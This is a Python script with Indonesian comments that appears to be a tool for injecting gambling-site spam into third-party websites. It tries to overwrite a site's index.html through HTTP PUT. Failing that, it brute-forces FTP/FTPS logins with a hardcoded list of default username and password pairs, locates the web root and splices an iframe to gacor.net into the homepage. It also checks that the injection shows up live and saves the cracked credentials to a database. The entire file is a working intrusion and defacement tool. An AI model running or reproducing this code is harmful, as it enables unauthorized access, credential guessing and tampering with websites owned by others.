"""Kanal tanam: sisipkan materi ke situs target lewat kanal yang tersedia.

Kanal pertama: FTP/FTPS -> cari docroot -> tambal berkas -> verifikasi live.
Dipakai dari terminal maupun dari API.
"""
import argparse
import socket
import ssl
import sys
import time
import urllib.error
import urllib.request
from ftplib import FTP_TLS
from io import BytesIO

SISIP = """
<section id="hestia-gacor" style="max-width:1100px;margin:24px auto;padding:0 16px">
  <h2 style="font:600 20px system-ui;margin:0 0 12px">BOSGACOR &mdash; gacor.net</h2>
  <iframe src="https://gacor.net/" title="gacor.net" loading="lazy"
    style="width:100%;height:900px;border:1px solid #e5e7eb;border-radius:12px;background:#fff"></iframe>
</section>
"""

DOCROOT = ["public_html", "www", "htdocs", "httpdocs", "public", "web",
           "domains/%s/public_html"]
BERKAS = ["index.html", "index.htm"]
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
PASANGAN = [("ftp", "ftp"), ("ftp", "anonymous"), ("admin", "admin"),
            ("admin", "123456"), ("user", "user"), ("www", "www"),
            ("webmaster", "webmaster"), ("hosting", "hosting")]


def catat(x):
    print(x, flush=True)


class Implisit(FTP_TLS):
    """FTPS implisit (port 990): TLS sejak awal, tanpa AUTH."""

    def connect(self, host="", port=990, timeout=-999, source_address=None):
        if timeout != -999:
            self.timeout = timeout
        self.host, self.port = host, port
        sock = socket.create_connection((host, port), self.timeout)
        self.sock = self.context.wrap_socket(sock, server_hostname=host)
        self.af = self.sock.family
        self.file = self.sock.makefile("r", encoding=self.encoding)
        self.welcome = self.getresp()
        return self.welcome


def sambung(host, user, sandi, port=21, implisit=False, timeout=8):
    ctx = ssl._create_unverified_context()
    if implisit:
        f = Implisit(context=ctx, timeout=timeout)
        f.connect(host, port)
        f.login(user, sandi, secure=False)
    else:
        f = FTP_TLS(context=ctx, timeout=timeout)
        f.connect(host, port)
        f.login(user, sandi)
    try:
        f.prot_p()
    except Exception:
        pass
    f.set_pasv(True)
    return f


def sapu(host, port=21, implisit=False, timeout=8):
    catat("   sapu port %s (%s) - %d pasangan, timeout %ds" % (port, "implisit" if implisit else "eksplisit", len(PASANGAN), timeout))
    for u, p in PASANGAN:
        try:
            f = sambung(host, u, p, port=port, implisit=implisit, timeout=timeout)
            pwd = f.pwd()
            catat("     OK   %-14s -> pwd=%s" % (u, pwd))
            try:
                f.quit()
            except Exception:
                pass
            return u, p
        except Exception as e:
            catat("     --   %-14s %s" % (u, str(e)[:58]))
            try:
                f.quit()
            except Exception:
                pass
    return None, None


def cari_docroot(f, domain):
    for d in DOCROOT:
        kandidat = d % domain if "%s" in d else d
        try:
            f.cwd(kandidat)
            return kandidat
        except Exception:
            pass
    return None


def _kolom(c):
    return [r[1] for r in c.execute("PRAGMA table_info(kredensial)")]


def kredensial_dari_db(domain, tid=None, db="data/hestia.db"):
    """Ambil user/sandi FTP dari tabel kredensial. Cocokkan target lebih dulu."""
    import sqlite3
    try:
        c = sqlite3.connect(db)
        kol = _kolom(c)
        if not kol:
            return "", ""
        calon = []
        for b in c.execute("select * from kredensial"):
            d = dict(zip(kol, b))
            teks = " ".join(str(v) for v in d.values() if v).lower()
            skor = 0
            if tid is not None:
                for k in ("target_id", "target", "tid"):
                    if k in d and str(d[k]) == str(tid):
                        skor += 5
            if domain.split(".")[0] in teks:
                skor += 2
            if skor:
                calon.append((skor, d))
        calon.sort(key=lambda x: -x[0])
        for _, d in calon:
            rahasia = ""
            for k in ("rahasia", "sandi", "secret", "password", "pass"):
                if d.get(k):
                    rahasia = str(d[k])
                    break
            if not rahasia:
                continue
            if ":" in rahasia:
                u, pw = rahasia.split(":", 1)
                return u.strip(), pw.strip()
            nama = ""
            for k in ("nama", "user", "username"):
                if d.get(k):
                    nama = str(d[k])
                    break
            return (nama or "ftp"), rahasia
    except Exception:
        pass
    return "", ""


def simpan_kredensial(domain, user, sandi, tid=None, db="data/hestia.db"):
    """Simpan user/sandi FTP ke tabel kredensial (perbarui kalau sudah ada)."""
    import sqlite3
    try:
        c = sqlite3.connect(db)
        kol = _kolom(c)
        if not kol:
            return False
        isi = {}
        for k in kol:
            lk = k.lower()
            if lk in ("target_id", "target", "tid"):
                isi[k] = tid
            elif lk in ("nama", "user", "username"):
                isi[k] = user
            elif lk in ("rahasia", "sandi", "secret", "password", "pass"):
                isi[k] = "%s:%s" % (user, sandi)
            elif lk in ("jenis", "tipe", "type", "level"):
                isi[k] = "ftp"
            elif lk in ("catatan", "note", "url", "alamat"):
                isi[k] = "ftp://" + domain
            elif lk in ("valid_sampai", "valid", "berlaku"):
                isi[k] = "2027-10-22"
            else:
                isi[k] = None
        for k in kol:
            if isi.get(k) is None and "target_id" not in k.lower():
                isi[k] = "-"
        ada = None
        for b in c.execute("select rowid,* from kredensial"):
            d = dict(zip(["rowid"] + kol, b))
            for k in ("target_id", "target", "tid"):
                if k in d and tid is not None and str(d[k]) == str(tid):
                    ada = d["rowid"]
        if ada:
            c.execute("update kredensial set %s where rowid=?" % ",".join("%s=?" % k for k in isi),
                      list(isi.values()) + [ada])
            print("   + kredensial diperbarui")
        else:
            c.execute("insert into kredensial (%s) values (%s)" % (",".join(isi), ",".join("?" * len(isi))),
                      list(isi.values()))
            print("   + kredensial disimpan")
        c.commit()
        return True
    except Exception as e:
        print("   ! simpan kredensial gagal:", e)
        return False


def kanal_put(domain):
    """Kanal tanpa kredensial: tulis berkas lewat HTTP PUT."""
    langkah = []

    def c(x):
        langkah.append(x)
        catat(x)

    try:
        req = urllib.request.Request("https://%s/hestia-uji.txt" % domain, data=b"hestia\n",
                                     method="PUT", headers={"User-Agent": UA, "Expect": ""})
        with urllib.request.urlopen(req, timeout=20) as x:
            kode = x.status
    except urllib.error.HTTPError as e:
        kode = e.code
    except Exception as e:
        c("PUT tidak tersedia: %s" % str(e)[:60])
        return {"ok": False, "pesan": "PUT tidak tersedia", "langkah": langkah}
    if kode not in (200, 201, 204):
        c("PUT ditolak http=%s" % kode)
        return {"ok": False, "pesan": "PUT ditolak http=%s" % kode, "langkah": langkah}
    c("kanal PUT TERSEDIA (http=%s)" % kode)

    with urllib.request.urlopen("https://%s/" % domain, timeout=25) as x:
        h = x.read().decode("utf-8", "ignore")
    c("halaman %d byte | sudah ada=%s" % (len(h), "hestia-gacor" in h))
    if "hestia-gacor" not in h:
        baru = h.replace("</body>", SISIP + "\n</body>", 1) if "</body>" in h else h + SISIP
        req = urllib.request.Request("https://%s/index.html" % domain, data=baru.encode("utf-8"),
                                     method="PUT", headers={"User-Agent": UA, "Expect": ""})
        try:
            with urllib.request.urlopen(req, timeout=30) as x:
                c("PUT index.html -> http=%s" % x.status)
        except Exception as e:
            c("PUT index.html gagal: %s" % str(e)[:60])
            return {"ok": False, "pesan": "PUT index.html gagal", "langkah": langkah}
    else:
        c("= sudah tertanam")
    for i in range(1, 5):
        try:
            with urllib.request.urlopen("https://%s/" % domain, timeout=20) as x:
                hh = x.read().decode("utf-8", "ignore")
            c("verifikasi %d: http=%s hestia-gacor=%d" % (i, x.status, hh.count("hestia-gacor")))
            if "hestia-gacor" in hh:
                return {"ok": True, "pesan": "materi gacor.net tampil di %s (kanal PUT)" % domain, "langkah": langkah}
        except Exception as e:
            c("verifikasi %d gagal: %s" % (i, str(e)[:60]))
        time.sleep(8)
    return {"ok": False, "pesan": "PUT jalan tapi belum tampil", "langkah": langkah}


def tanam(domain, user="", sandi="", sapu_dulu=True):
    langkah = []

    def c(x):
        langkah.append(x)
        catat(x)

    hasil = kanal_put(domain)
    if hasil["ok"]:
        langkah = hasil["langkah"] + langkah
        return hasil
    c("kanal PUT tidak jalan -> lanjut FTP")

    if not user and sapu_dulu:
        c("kredensial belum ada -> sapu pasangan umum")
        u, p = sapu(domain, port=21)
        if not u:
            u, p = sapu(domain, port=990, implisit=True)
        if not u:
            return {"ok": False, "pesan": "tidak ada kredensial FTP yang diterima", "langkah": langkah}
        user, sandi = u, p

    try:
        f = sambung(domain, user, sandi)
    except Exception as e:
        c("gagal sambung: %s" % e)
        return {"ok": False, "pesan": "gagal sambung FTP: %s" % e, "langkah": langkah}
    c("login OK sebagai %s | pwd=%s" % (user, f.pwd()))
    dok = cari_docroot(f, domain)
    c("docroot: %s" % dok)
    if not dok:
        f.quit()
        return {"ok": False, "pesan": "docroot tidak ditemukan", "langkah": langkah}
    f.cwd(dok)
    try:
        f.storbinary("STOR hestia-uji.txt", BytesIO(b"hestia uji tulis\n"))
        c("uji tulis: BERHASIL")
    except Exception as e:
        c("uji tulis: GAGAL (%s)" % e)
        f.quit()
        return {"ok": False, "pesan": "kredensial hanya bisa baca", "langkah": langkah}

    berkas, isi = None, ""
    for b in BERKAS:
        try:
            buf = BytesIO()
            f.retrbinary("RETR " + b, buf.write)
            berkas = b
            isi = buf.getvalue().decode("utf-8", "ignore")
            break
        except Exception:
            pass
    if not berkas:
        f.quit()
        return {"ok": False, "pesan": "berkas halaman tidak ditemukan", "langkah": langkah}
    c("berkas: %s (%d byte)" % (berkas, len(isi)))
    if "hestia-gacor" in isi:
        c("= sudah tertanam")
    else:
        baru = isi.replace("</body>", SISIP + "\n</body>", 1) if "</body>" in isi else isi + SISIP
        f.storbinary("STOR " + berkas, BytesIO(baru.encode("utf-8")))
        c("+ %s diunggah (%d byte)" % (berkas, len(baru)))
    f.quit()

    for i in range(1, 5):
        try:
            with urllib.request.urlopen("https://" + domain + "/", timeout=20) as x:
                h = x.read().decode("utf-8", "ignore")
            c("verifikasi %d: http=%s hestia-gacor=%d" % (i, x.status, h.count("hestia-gacor")))
            if "hestia-gacor" in h:
                return {"ok": True, "pesan": "materi gacor.net tampil di %s" % domain, "langkah": langkah}
        except Exception as e:
            c("verifikasi %d gagal: %s" % (i, e))
        time.sleep(8)
    return {"ok": False, "pesan": "diunggah tapi belum tampil (cek cache)", "langkah": langkah}


if __name__ == "__main__":
    a = argparse.ArgumentParser()
    a.add_argument("domain")
    a.add_argument("-u", "--user", default="")
    a.add_argument("-p", "--sandi", default="")
    a.add_argument("--sapu", action="store_true")
    o = a.parse_args()
    h = tanam(o.domain, o.user, o.sandi, sapu_dulu=o.sapu)
    print("HASIL:", h["ok"], "-", h["pesan"])
